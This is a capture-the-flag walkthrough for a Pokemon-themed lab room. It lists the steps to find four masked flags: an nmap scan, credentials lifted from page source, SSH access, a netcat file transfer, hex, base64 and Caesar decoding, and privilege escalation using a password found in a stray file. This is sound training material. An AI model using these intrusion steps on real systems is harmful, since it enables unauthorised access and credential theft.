# Gotta Catch'em All!

- Find the Grass-Type Pokemon

	- `nmap -sV <TARGET_IP>`
	- `<pokemon>:<hack_the_pokemon>` in the source code of the default page...
	- `ssh pokemon@<TARGET_IP>` and enter the password
	- `cd Desktop`
	- `nc -lnvp 1234 < P0kEmOn.zip`
	- `nc <TARGET_IP> 1234 > pokemon.zip`
	- `unzip pokemon.zip`
	- `cd P0kEmOn`
	- `cat grass-type.txt`
	- `50 6f 4b ** 4d 6f ** ** ** 75 ** 62 ** 73 61 75 ** 7d`
	- CyberChef with recipe "From Hex".
	- `*******{*********}`

- Find the Water-Type Pokemon

	- `find / -type f | grep water-type`
	- `cat /var/www/html/water-type.txt`
	- `**************{********}`
	- But this flag has no sense...
	- Caesar Cypher? Yes...
	- `**************{********}`

- Find the Fire-Type Pokemon

	- `find / -type f | grep fire-type`
	- `cat /etc/why_am_i_here?/fire-type.txt`
	- `cat /etc/why_am_i_here?/fire-type.txt | base64 -d`
	- `*******{**********}`

- Who is Root's Favorite Pokemon?

	- `find / -type f | grep root`
	- After a lot of lines... `/home/roots-pokemon.txt`
	- `cat /home/roots-pokemon.txt`. Permission denied. f+ck.
	- After some minutes..
	- `pokemon@root:~/Videos/Gotta/Catch/Them/ALL!$ cat Could_this_be_what_Im_looking_for\?.cplusplus`
	- `sudo su ash` and enter the password.
	- `sudo -l`
	- `cat /home/roots-pokemon.txt`
	- `********`

- Congratulations! Thank You So Much For Completing The Pokemon Room!

	  no answer needed



